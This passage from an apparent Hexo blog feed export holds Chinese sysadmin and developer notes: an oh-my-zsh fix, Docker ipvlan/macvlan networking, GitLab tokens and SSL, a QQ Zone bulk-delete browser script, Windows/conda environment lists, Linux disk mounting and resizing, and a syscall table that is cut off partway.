        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>oh-my-zsh使用默认插件的时候在遇到git目录，每次都会执行git status，所以在大型git项目或者远程的git目录中就会特别卡顿。<br>通过搜索发现还是直接去了最简单</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><pre><code class="bash">git config oh-my-zsh.hide-dirty 1git config oh-my-zsh.hide-status 1</code></pre><p>全没用</p><p><code>vim ~/.oh-my-zsh/themes/robbyrussell.zsh-theme</code><br>把带git的都注释了</p><p>然后<code>vim ~/.zshrc</code></p><pre><code class="bash">plugins=(zsh-autosuggestions autojump)</code></pre><p>把git去掉<br><code>source ~/.zshrc</code><br>重启一个新终端</p><p>不卡了</p>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> oh-my-zsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker直连物理网络</title>
      <link href="/2021/12/25/docker-zhi-lian-wu-li-wang-luo/"/>
      <url>/2021/12/25/docker-zhi-lian-wu-li-wang-luo/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>docker的使用都是基于端口映射进行使用的，但是作为实际中，我们需要直接对docker分配物理网络中的ip会更方便<br>直接用交换机和路由器对其进行管理</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在docker中，提供了ipvlan和macvlan两种方式可以达成这个目的,同时还可以支持ipv6<br>缺点是无法容器无法dhcp来获得ip，只能自己定义ip范围。且多个机子得自己指定network中分配的ip段<br>同时同一个物理网卡中ipvlan和macvlan不能同时存在，会报<code>device or resource busy</code></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>ubuntu20.04-5.4.0-91<br>docker-ce:19.03.14</p><h2 id="ipvlan"><a href="#ipvlan" class="headerlink" title="ipvlan"></a>ipvlan</h2><p>可以获得物理ip,但是由于没有mac地址，所以在交换机显示的还是物理网卡的mac地址<br>subnet,gateway,ip-range,parent根据自己实际情况进行更改<br>ipvlan_mode有两种，l2是二层交换机,l3是三层交换机，根据自己需求来使用，一般应该l2就可以满足了<br><a href="https://docs.docker.com/network/ipvlan/">参考链接</a></p><pre><code class="bash">docker network  create -d ipvlan --subnet=10.1.8.0/25 --gateway=10.1.8.1 -o ipvlan_mode=l2 --ip-range=10.1.8.49/30 -o parent=ens192 ipvlan</code></pre><p>使用方法</p><pre><code class="bash">docker run --net=ipvlan -itd nginx</code></pre><h2 id="macvlan"><a href="#macvlan" class="headerlink" title="macvlan"></a>macvlan</h2><p>多了一个mac地址，其他的和ipvlan基本上没有区别<br>macvlan_mode有bridge,passthru,private,VEPA<br>正常推荐直接默认的bridge<br><a href="https://www.cnblogs.com/charlieroro/p/9656769.html">参考链接</a></p><pre><code class="bash">docker network create -d macvlan --subnet=10.1.8.0/25 --ip-range=10.1.8.19/30 --gateway=10.1.8.1 -o macvlan_mode=bridge -o parent=ens192 macvlan</code></pre><p>使用方法</p><pre><code class="bash">docker run --net=macvlan -itd nginx</code></pre><h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>在使用macvlan的情况下需要开启内核转发<br>&#x2F;etc&#x2F;sysctl.conf</p><pre><code class="bash">net.ipv4.ip_forward = 1</code></pre><p>临时</p><pre><code class="bash">sysctl -w net.ipv4.ip_forward=1</code></pre><p>所以如果自己内网构建的话对mac地址无需求的情况下直接选ipvlan吧<br>出现网络不可达的情况下可能需要通过iptables进行放开</p><pre><code class="bash">iptables -I DOCKER -d 10.1.8.1/8 -j ACCEPT</code></pre><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>如果两台机子，同时使用一个分配的段，会是什么结果</p><pre><code class="bash">A 10.1.8.3B 10.1.8.4docker run --net=ipvlan -itd nginx</code></pre><p>这时候两台nginx都是10.1.8.48</p><p>在A上面</p><pre><code class="bash">root@53579423823f:/usr/share/nginx/html# echo 1 &gt; index.htmlroot@53579423823f:/usr/share/nginx/html# exitexitcurl 10.1.8.48                                                                             2</code></pre><p>在B上面</p><pre><code class="bash">root@c989601b4464:/# echo 2 &gt; /usr/share/nginx/html/index.htmlroot@c989601b4464:/# exitexitcurl 10.1.8.48                                                                             1</code></pre><p>实验多次都是这个结果，好家伙，兔子不吃窝边草，专门挑别人家的。很值得学习<br>此时，如果是外面的机子访问，会有什么情况呢？</p><pre><code class="bash">PING 10.1.8.48 (10.1.8.48) 56(84) bytes of data.64 bytes from 10.1.8.48: icmp_seq=1 ttl=63 time=0.486 ms64 bytes from 10.1.8.48: icmp_seq=2 ttl=63 time=0.757 ms^Ccurl 10.1.8.481</code></pre><p>我们调换创建的顺序发现和创建的时间有关，不过这可以算一个同ip的负载均衡的解决方法。感觉这儿可以有点思考的空间</p>]]></content>
      
      
      <categories>
          
          <category> virtualization </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Macvlan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工具的整理</title>
      <link href="/2021/12/22/ni-xiang-gong-ju-de-zheng-li/"/>
      <url>/2021/12/22/ni-xiang-gong-ju-de-zheng-li/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>对于逆向工具的整理一下下，预测不断更新<br>总是忘记啥工具的名字很头疼 </p><h2 id="PE查信息"><a href="#PE查信息" class="headerlink" title="PE查信息"></a>PE查信息</h2><ul><li>peid</li><li>Exeinfo PE</li></ul><h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><ul><li>ida pro</li><li>ghidra</li><li>dnspy</li></ul><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><ul><li>ollydbg 插件<code>ollydump</code></li></ul><h2 id="16进制编辑器"><a href="#16进制编辑器" class="headerlink" title="16进制编辑器"></a>16进制编辑器</h2><ul><li>010editor</li></ul><h2 id="查看重定位表"><a href="#查看重定位表" class="headerlink" title="查看重定位表"></a>查看重定位表</h2><ul><li>LordPE</li></ul>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于gitlab项目访问令牌的使用</title>
      <link href="/2021/10/10/guan-yu-gitlab-xiang-mu-fang-wen-ling-pai-de-shi-yong/"/>
      <url>/2021/10/10/guan-yu-gitlab-xiang-mu-fang-wen-ling-pai-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>以前使用gitlab直接都是把机子的ssh密钥丢进去，随着机子越来越多，需要使用项目访问令牌方便进行，保证不用的时候删令牌或者自动令牌过期就行，从而保证安全性</p><h3 id="项目访问令牌"><a href="#项目访问令牌" class="headerlink" title="项目访问令牌"></a>项目访问令牌</h3><p><img src="/img/2021/10/10/project_token.png" alt="project_token"></p><table><thead><tr><th align="center">范围</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">api</td><td align="center">授予对作用域项目 API 的完整读&#x2F;写访问权限，包括包注册表。</td></tr><tr><td align="center">read_api</td><td align="center">授予对作用域项目 API 的读取访问权限，包括Package Registry。</td></tr><tr><td align="center">read_registry</td><td align="center">如果项目是私有的并且需要授权，则允许对容器注册表映像进行读取访问（拉取）。</td></tr><tr><td align="center">write_registry</td><td align="center">允许对容器注册表进行写访问（推送）。</td></tr><tr><td align="center">read_repository</td><td align="center">允许对存储库进行只读访问（拉取）。</td></tr><tr><td align="center">write_repository</td><td align="center">允许对存储库进行读写访问（拉、推）。</td></tr></tbody></table><p>一般来说，用<code>read_repository</code> 或者 <code>write_repository</code> 就够了</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>获得了token之后</p><pre><code class="bash">git clone https://oauth2:token@url/user/repo.git</code></pre><p>OK了</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gitlab </tag>
            
            <tag> oauth2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于gitlab和nextcloud增加ssl的记录</title>
      <link href="/2021/10/10/guan-yu-gitlab-he-nextcloud-zeng-jia-ssl-de-ji-lu/"/>
      <url>/2021/10/10/guan-yu-gitlab-he-nextcloud-zeng-jia-ssl-de-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>给gitlab 和 nextcloud 添加ssl证书，方便从外网访问时的安全性，但是也同时保证内网的便捷可用，尽量做到不改动</p><h3 id="gitlab"><a href="#gitlab" class="headerlink" title="gitlab"></a>gitlab</h3><p>修改gitlab.rb<br>修改external_url</p><pre><code class="bash">external_url &#39;https://$host:$port&#39;</code></pre><p>添加</p><pre><code class="bash">nginx[&#39;enable&#39;] = truenginx[&#39;redirect_http_to_https&#39;] = truenginx[&#39;redirect_http_to_https_port&#39;] = $portnginx[&#39;listen_port&#39;] = $ssl_portletsencrypt[&#39;enable&#39;] = falseletsencrypt[&#39;auto_renew&#39;] = false</code></pre><p>将证书挂载到<code>/etc/gitlab/ssl/</code>下面重启gitlab就行</p><h3 id="nextcloud"><a href="#nextcloud" class="headerlink" title="nextcloud"></a>nextcloud</h3><p>修改config.php<br>添加 <code>&#39;overwriteprotocol&#39; =&gt; &#39;https&#39;,</code></p><p>然后修改docker-compose.yaml</p><pre><code class="yaml">nginx:    image: nginx    restart: always    ports:      - 80:80      - 443:443    volumes:      - ./cert:/usr/local/nginx/cert      - ./default.conf:/etc/nginx/conf.d/default.conf    links:      - app</code></pre><p>cert下面是证书</p><pre><code class="conf">server &#123;    listen 80;    listen [::]:80;    server_name domain;    # redirect all HTTP requests to HTTPS with a 301 Moved Permanently response.    return 301 https://$host$request_uri;&#125;server &#123;  listen 443 ssl http2;  listen [::]:443 ssl http2;  server_name domain;  ssl on;  ssl_certificate /usr/local/nginx/cert/domain.pem;  ssl_certificate_key /usr/local/nginx/cert/domain.key;  client_max_body_size 10G;  add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot;;  location = /.well-known/carddav &#123;      return 301 $scheme://$host:$server_port/remote.php/dav;  &#125;  location = /.well-known/caldav &#123;      return 301 $scheme://$host:$server_port/remote.php/dav;  &#125;  location / &#123;      proxy_redirect off;      proxy_pass http://app;      proxy_set_header Host $http_host;  &#125;  location = /.htaccess &#123;      return 404;  &#125;&#125;</code></pre><p>等待dns刷新，网页访问即可</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
            <tag> https </tag>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qq空间批量删除代码</title>
      <link href="/2021/01/13/qq-kong-jian-pi-liang-shan-chu-dai-ma/"/>
      <url>/2021/01/13/qq-kong-jian-pi-liang-shan-chu-dai-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>对于qq空间批量删除日志和相册的代码<br>直接抄网上日志的，自己改改</p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><pre><code class="js">(async () =&gt; &#123;    let frameDocument = document.querySelector(&#39;.app_canvas_frame&#39;).contentWindow.document;    while (true) &#123;        frameDocument.querySelectorAll(&#39;.del_btn&#39;).forEach(item =&gt; item.click());        await sleep(1500);        document.querySelectorAll(&#39;.qz_dialog_layer_sub&#39;).forEach(item =&gt; item.click());        await sleep(1500);        nextPage();        await sleep(1000);    &#125;    function nextPage() &#123;        let aTags = frameDocument.querySelector(&#39;.mod_pagenav_main&gt;a&#39;);        for (let item of aTags) &#123;            if (item.innerText == &#39;下一页&#39;) &#123;                item.click();                break;            &#125;        &#125;    &#125;    function sleep(time) &#123;        return new Promise(resolve =&gt; setTimeout(resolve, time));    &#125;&#125;)();</code></pre><h2 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h2><pre><code class="js">(async () =&gt; &#123;    let frameDocument = document.querySelector(&#39;.app_canvas_frame&#39;).contentWindow.document;    while (true) &#123;        frameDocument.querySelectorAll(&#39;.js-album-delete&#39;).forEach(item =&gt; item.click());        await sleep(1500);    &#125;    function sleep(time) &#123;        return new Promise(resolve =&gt; setTimeout(resolve, time));    &#125;&#125;)();</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10_2004全软件模版</title>
      <link href="/2020/12/30/win10-2004-quan-ruan-jian-mo-ban/"/>
      <url>/2020/12/30/win10-2004-quan-ruan-jian-mo-ban/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>关于win10下使用的软件等全功能模版机子使用的软件的大全</p><h2 id="开发IDE"><a href="#开发IDE" class="headerlink" title="开发IDE"></a>开发IDE</h2><ul><li>vscode</li><li>visual studio</li><li>sublime text</li><li>JetBrains GoLand</li><li>JetBrains CLion</li><li>JetBrains Pycharm</li><li>JetBrains DataGrip</li><li>JetBrains IDEA</li><li>JetBrains Rider</li><li>JetBrains RubyMine</li><li>JetBrains PhpStorm</li></ul><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><ul><li>phpstudy</li><li>miniconda</li></ul><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>miniconda 具有两个环境<br>这里给出env.yml和requirements.txt</p><h4 id="py2"><a href="#py2" class="headerlink" title="py2"></a>py2</h4><pre><code class="yml">name: py2channels:  - defaultsdependencies:  - ca-certificates=2020.12.8=haa95532_0  - certifi=2020.6.20=pyhd3eb1b0_3  - pycrypto=2.6.1=py27h0c8e037_9  - python=2.7.18=hfb89ab9_0  - setuptools=44.0.0=py27_0  - sqlite=3.30.1=h0c8e037_0  - vc=9=h7299396_1  - vs2008_runtime=9.00.30729.1=hfaea7d5_1  - wheel=0.36.2=pyhd3eb1b0_0  - wincertstore=0.2=py27hf04cefb_0  - pip:    - attrs==20.3.0    - backports-abc==0.5    - backports-functools-lru-cache==1.6.1    - backports-shutil-get-terminal-size==1.0.0    - backports-shutil-which==3.5.2    - bcrypt==3.1.7    - bleach==3.2.1    - capstone==4.0.2    - cffi==1.14.4    - chardet==4.0.0    - colorama==0.4.4    - configparser==4.0.2    - contextlib2==0.6.0.post1    - cryptography==3.3.1    - decorator==4.4.2    - defusedxml==0.6.0    - entrypoints==0.3    - enum==0.4.7    - enum34==1.1.10    - functools32==3.2.3.post2    - futures==3.3.0    - gmpy2==2.0.8    - idna==2.10    - importlib-metadata==2.1.1    - intervaltree==3.1.0    - ipykernel==4.10.1    - ipython==5.10.0    - ipython-genutils==0.2.0    - ipywidgets==7.6.2    - jinja2==2.11.2    - jsonschema==3.2.0    - jupyter==1.0.0    - jupyter-client==5.3.5    - jupyter-console==5.2.0    - jupyter-core==4.6.3    - libnum==1.6.1    - mako==1.1.3    - markupsafe==1.1.1    - mistune==0.8.4    - nbconvert==5.6.1    - nbformat==4.4.0    - notebook==5.7.10    - packaging==20.8    - pandocfilters==1.4.3    - paramiko==2.7.2    - pathlib2==2.3.5    - pickleshare==0.7.5    - pip==20.3.3    - prometheus-client==0.9.0    - prompt-toolkit==1.0.18    - psutil==5.8.0    - pwntools==4.3.1    - pycparser==2.20    - pyelftools==0.27    - pygments==2.5.2    - pynacl==1.4.0    - pyparsing==2.4.7    - pyrsistent==0.16.1    - pyserial==3.5    - pysocks==1.7.1    - python-dateutil==2.8.1    - pywin32==228    - pywinpty==0.5.7    - pyzmq==19.0.2    - qtconsole==4.7.7    - qtpy==1.9.0    - requests==2.25.1    - ropgadget==6.4    - scandir==1.10.0    - send2trash==1.5.0    - simplegeneric==0.8.1    - singledispatch==3.4.0.3    - six==1.15.0    - sortedcontainers==2.3.0    - terminado==0.8.3    - testpath==0.4.4    - tornado==5.1.1    - traitlets==4.3.3    - unicorn==1.0.2rc3    - urllib3==1.26.2    - wcwidth==0.2.5    - webencodings==0.5.1    - widgetsnbextension==3.5.1    - win-unicode-console==0.5    - zipp==1.2.0</code></pre><p>其中gmpy2单独安装<code>https://download.lfd.uci.edu/pythonlibs/z4tqcw5k/cp27/gmpy2-2.0.8-cp27-cp27m-win_amd64.whl</code><br>ipaddress 报错说Metadata不存在时把这个文件放进去</p><pre><code class="bash">Metadata-Version: 2.1Name: ipaddressVersion: 1.0.23Summary: Python 2 and 3 compatibility utilitiesAuthor: Benjamin PetersonAuthor-email: benjamin@python.orgLicense: MITPlatform: UNKNOWNClassifier: Development Status :: 5 - Production/StableClassifier: Programming Language :: Python :: 2Classifier: Programming Language :: Python :: 3Classifier: Intended Audience :: DevelopersClassifier: License :: OSI Approved :: MIT LicenseClassifier: Topic :: Software Development :: LibrariesClassifier: Topic :: UtilitiesRequires-Python: &gt;=2.7, !=3.0.*, !=3.1.*, !=3.2.*</code></pre><p>最后补一下</p><pre><code class="bash">python -m pip install enum pwntools jupyter notebook </code></pre><h4 id="py3"><a href="#py3" class="headerlink" title="py3"></a>py3</h4><pre><code class="yml">name: py3channels:  - defaultsdependencies:  - argon2-cffi=20.1.0=py38he774522_1  - async_generator=1.10=py_0  - attrs=20.3.0=pyhd3eb1b0_0  - backcall=0.2.0=py_0  - bleach=3.2.1=py_0  - ca-certificates=2020.12.8=haa95532_0  - certifi=2020.12.5=py38haa95532_0  - cffi=1.14.4=py38hcd4344a_0  - colorama=0.4.4=pyhd3eb1b0_0  - decorator=4.4.2=py_0  - defusedxml=0.6.0=py_0  - entrypoints=0.3=py38_0  - gmpy2=2.0.8=py38h7edee0f_3  - icu=58.2=ha925a31_3  - importlib-metadata=2.0.0=py_1  - importlib_metadata=2.0.0=1  - ipykernel=5.3.4=py38h5ca1d4c_0  - ipython=7.19.0=py38hd4e2768_0  - ipython_genutils=0.2.0=pyhd3eb1b0_1  - ipywidgets=7.6.0=pyhd3eb1b0_1  - jedi=0.18.0=py38haa95532_0  - jinja2=2.11.2=py_0  - jpeg=9b=hb83a4c4_2  - jsonschema=3.2.0=py_2  - jupyter=1.0.0=py38_7  - jupyter_client=6.1.7=py_0  - jupyter_console=6.2.0=py_0  - jupyter_core=4.7.0=py38haa95532_0  - jupyterlab_pygments=0.1.2=py_0  - libpng=1.6.37=h2a8f88b_0  - libsodium=1.0.18=h62dcd97_0  - m2w64-gcc-libgfortran=5.3.0=6  - m2w64-gcc-libs=5.3.0=7  - m2w64-gcc-libs-core=5.3.0=7  - m2w64-gmp=6.1.0=2  - m2w64-libwinpthread-git=5.0.0.4634.697f757=2  - markupsafe=1.1.1=py38he774522_0  - mistune=0.8.4=py38he774522_1000  - mpc=1.1.0=h7edee0f_1  - mpfr=4.0.2=h62dcd97_1  - mpir=3.0.0=hec2e145_1  - msys2-conda-epoch=20160418=1  - nbclient=0.5.1=py_0  - nbconvert=6.0.7=py38_0  - nbformat=5.0.8=py_0  - nest-asyncio=1.4.3=pyhd3eb1b0_0  - notebook=6.1.6=py38haa95532_0  - openssl=1.1.1i=h2bbff1b_0  - packaging=20.8=pyhd3eb1b0_0  - pandoc=2.11=h9490d1a_0  - pandocfilters=1.4.3=py38haa95532_1  - pickleshare=0.7.5=pyhd3eb1b0_1003  - pip=20.3.3=py38haa95532_0  - prometheus_client=0.9.0=pyhd3eb1b0_0  - prompt-toolkit=3.0.8=py_0  - prompt_toolkit=3.0.8=0  - pycparser=2.20=py_2  - pygments=2.7.3=pyhd3eb1b0_0  - pyparsing=2.4.7=py_0  - pyqt=5.9.2=py38ha925a31_4  - pyrsistent=0.17.3=py38he774522_0  - python=3.8.5=h5fd99cc_1  - python-dateutil=2.8.1=py_0  - pywin32=227=py38he774522_1  - pywinpty=0.5.7=py38_0  - pyzmq=20.0.0=py38hd77b12b_1  - qt=5.9.7=vc14h73c81de_0  - qtconsole=4.7.7=py_0  - qtpy=1.9.0=py_0  - send2trash=1.5.0=pyhd3eb1b0_1  - setuptools=51.0.0=py38haa95532_2  - sip=4.19.13=py38ha925a31_0  - six=1.15.0=py38haa95532_0  - sqlite=3.33.0=h2a8f88b_0  - terminado=0.9.1=py38_0  - testpath=0.4.4=py_0  - tornado=6.1=py38h2bbff1b_0  - traitlets=5.0.5=py_0  - vc=14.2=h21ff451_1  - vs2015_runtime=14.27.29016=h5e58377_2  - wcwidth=0.2.5=py_0  - webencodings=0.5.1=py38_1  - wheel=0.36.2=pyhd3eb1b0_0  - widgetsnbextension=3.5.1=py38_0  - wincertstore=0.2=py38_0  - winpty=0.4.3=4  - zeromq=4.3.3=ha925a31_3  - zipp=3.4.0=pyhd3eb1b0_0  - zlib=1.2.11=h62dcd97_4  - pip:    - bcrypt==3.2.0    - capstone==4.0.2    - chardet==4.0.0    - cryptography==3.3.1    - idna==2.10    - intervaltree==3.1.0    - jupyterlab-widgets==1.0.0    - mako==1.1.3    - paramiko==2.7.2    - parso==0.8.1    - psutil==5.8.0    - pwntools==4.3.1    - pyelftools==0.27    - pynacl==1.4.0    - pyserial==3.5    - pysocks==1.7.1    - requests==2.25.1    - ropgadget==6.4    - sortedcontainers==2.3.0    - unicorn==1.0.2rc3    - urllib3==1.26.2</code></pre><p>####导入</p><pre><code class="bash">conda env create -f environment.ymlpip install -r requirements.txt</code></pre><p>####导出</p><pre><code class="bash">conda env export &gt; environment.ymlpip freeze &gt; requirements.txt</code></pre><h2 id="安全相关"><a href="#安全相关" class="headerlink" title="安全相关"></a>安全相关</h2><ul><li>ida pro 7.5</li><li>ollydbg</li><li>apktools</li><li>burpsuite pro</li><li>ghidra</li><li>010 editor</li><li>cheatEngine</li><li>LordPE</li><li>peid</li><li>Exeinfo PE</li><li>dnspy</li></ul><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><ul><li>chrome</li><li>firefox</li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>everything</li><li>windows terminal</li><li>putty</li><li>mobaxterm</li><li>git</li></ul>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Template </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下文件系统操作整合</title>
      <link href="/2020/12/27/linux-xia-wen-jian-xi-tong-cao-zuo-zheng-he/"/>
      <url>/2020/12/27/linux-xia-wen-jian-xi-tong-cao-zuo-zheng-he/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>linux下对于文件系统的操作的一些集合</p><h2 id="开机挂载文件"><a href="#开机挂载文件" class="headerlink" title="开机挂载文件"></a>开机挂载文件</h2><h3 id="查看Linux硬盘信息："><a href="#查看Linux硬盘信息：" class="headerlink" title="查看Linux硬盘信息："></a>查看Linux硬盘信息：</h3><pre><code class="bash">sudo fdisk -l </code></pre><h3 id="格式化硬盘"><a href="#格式化硬盘" class="headerlink" title="格式化硬盘"></a>格式化硬盘</h3><pre><code class="bash">sudo mkfs.ext4 /dev/sdb</code></pre><h3 id="创建-x2F-data目录"><a href="#创建-x2F-data目录" class="headerlink" title="创建&#x2F;data目录"></a>创建&#x2F;data目录</h3><pre><code class="bash">sudo mkdir /data</code></pre><h3 id="挂载分区："><a href="#挂载分区：" class="headerlink" title="挂载分区："></a>挂载分区：</h3><pre><code class="bash">sudo mount /dev/sdb /data</code></pre><h3 id="查看磁盘分区的UUID"><a href="#查看磁盘分区的UUID" class="headerlink" title="查看磁盘分区的UUID"></a>查看磁盘分区的UUID</h3><pre><code class="bash">sudo sudo blkid</code></pre><h3 id="挂配置开机自动挂载："><a href="#挂配置开机自动挂载：" class="headerlink" title="挂配置开机自动挂载："></a>挂配置开机自动挂载：</h3><pre><code class="bash">echo &quot;UUID= /data ext4 defaults 0 1&quot; &gt;&gt; /etc/fstab</code></pre><h3 id="测试配置文件是否正确："><a href="#测试配置文件是否正确：" class="headerlink" title="测试配置文件是否正确："></a>测试配置文件是否正确：</h3><pre><code class="bash">sudo mount -a</code></pre><h2 id="扩充硬盘"><a href="#扩充硬盘" class="headerlink" title="扩充硬盘"></a>扩充硬盘</h2><h3 id="安装parted"><a href="#安装parted" class="headerlink" title="安装parted"></a>安装parted</h3><pre><code class="bash">apt-get install -y parted</code></pre><h3 id="parted"><a href="#parted" class="headerlink" title="parted"></a>parted</h3><pre><code class="bash">➜  parted /dev/sdbGNU Parted 3.2Using /dev/sdbWelcome to GNU Parted! Type &#39;help&#39; to view a list of commands.(parted) pModel: VMware Virtual disk (scsi)Disk /dev/sdb: 236GBSector size (logical/physical): 512B/512BPartition Table: loopDisk Flags:Number  Start  End    Size   File system  Flags 1      0.00B  236GB  236GB  ext4(parted) resizepart 1Warning: Partition /dev/sdb is being used. Are you sure you want to continue?Yes/No? yesEnd?  [236GB]?(parted) qInformation: You may need to update /etc/fstab.</code></pre><h3 id="resize2fs"><a href="#resize2fs" class="headerlink" title="resize2fs"></a>resize2fs</h3><pre><code class="bash">➜  resize2fs /dev/sdb resize2fs 1.44.5 (15-Dec-2018)Filesystem at /dev/sdb is mounted on /data; on-line resizing requiredold_desc_blocks = 27, new_desc_blocks = 28The filesystem on /dev/sdb is now 57671680 (4k) blocks long.</code></pre>]]></content>
      
      
      <categories>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Filesystem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syscall table</title>
      <link href="/2020/12/10/syscall-table/"/>
      <url>/2020/12/10/syscall-table/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>linux syscall table</p><h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><table><thead><tr><th align="center">%rax</th><th align="center">Name</th><th align="center">Entry point</th><th align="center">Implementation</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">read</td><td align="center">sys_read</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">1</td><td align="center">write</td><td align="center">sys_write</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">2</td><td align="center">open</td><td align="center">sys_open</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">3</td><td align="center">close</td><td align="center">sys_close</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">4</td><td align="center">stat</td><td align="center">sys_newstat</td><td align="center">fs&#x2F;stat.c</td></tr><tr><td align="center">5</td><td align="center">fstat</td><td align="center">sys_newfstat</td><td align="center">fs&#x2F;stat.c</td></tr><tr><td align="center">6</td><td align="center">lstat</td><td align="center">sys_newlstat</td><td align="center">fs&#x2F;stat.c</td></tr><tr><td align="center">7</td><td align="center">poll</td><td align="center">sys_poll</td><td align="center">fs&#x2F;select.c</td></tr><tr><td align="center">8</td><td align="center">lseek</td><td align="center">sys_lseek</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">9</td><td align="center">mmap</td><td align="center">sys_mmap</td><td align="center">arch&#x2F;x86&#x2F;kernel&#x2F;sys_x86_64.c</td></tr><tr><td align="center">10</td><td align="center">mprotect</td><td align="center">sys_mprotect</td><td align="center">mm&#x2F;mprotect.c</td></tr><tr><td align="center">11</td><td align="center">munmap</td><td align="center">sys_munmap</td><td align="center">mm&#x2F;mmap.c</td></tr><tr><td align="center">12</td><td align="center">brk</td><td align="center">sys_brk</td><td align="center">mm&#x2F;mmap.c</td></tr><tr><td align="center">13</td><td align="center">rt_sigaction</td><td align="center">sys_rt_sigaction</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">14</td><td align="center">rt_sigprocmask</td><td align="center">sys_rt_sigprocmask</td><td align="center">kernel&#x2F;signal.c</td></tr><tr><td align="center">15</td><td align="center">rt_sigreturn</td><td align="center">stub_rt_sigreturn</td><td align="center">arch&#x2F;x86&#x2F;kernel&#x2F;signal.c</td></tr><tr><td align="center">16</td><td align="center">ioctl</td><td align="center">sys_ioctl</td><td align="center">fs&#x2F;ioctl.c</td></tr><tr><td align="center">17</td><td align="center">pread64</td><td align="center">sys_pread64</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">18</td><td align="center">pwrite64</td><td align="center">sys_pwrite64</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">19</td><td align="center">readv</td><td align="center">sys_readv</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">20</td><td align="center">writev</td><td align="center">sys_writev</td><td align="center">fs&#x2F;read_write.c</td></tr><tr><td align="center">21</td><td align="center">access</td><td align="center">sys_access</td><td align="center">fs&#x2F;open.c</td></tr><tr><td align="center">22</td><td align="center">pipe</td><td align="center">sys_pipe</td><td align="center">fs&#x2F;pipe.c</td></tr><tr><td align="center">23</td><td align="center">select</td><td align="center">sys_select</td><td align="center">fs&#x2F;select.c</td></tr><tr><td align="center">24</td><td align="center">sched_yield</td><td align="center">sys_sched_yield</td><td align="center">kernel&#x2F;sched&#x2F;core.c</td></tr><tr><td align="center">25</td><td align="center">mremap</td><td align="center">sys_mremap</td><td align="center">mm&#x2F;mmap.c</td></tr><tr><td align="center">26</td><td align="center">msync</td><td align="center">sys_msync</td><td align="center">mm&#x2F;msync.c</td></tr><tr><td align="center">27</td><td align="center">mincore</td><td align="center">sys_mincore</td><td align="center">mm&#x2F;mincore.c</td></tr><tr><td 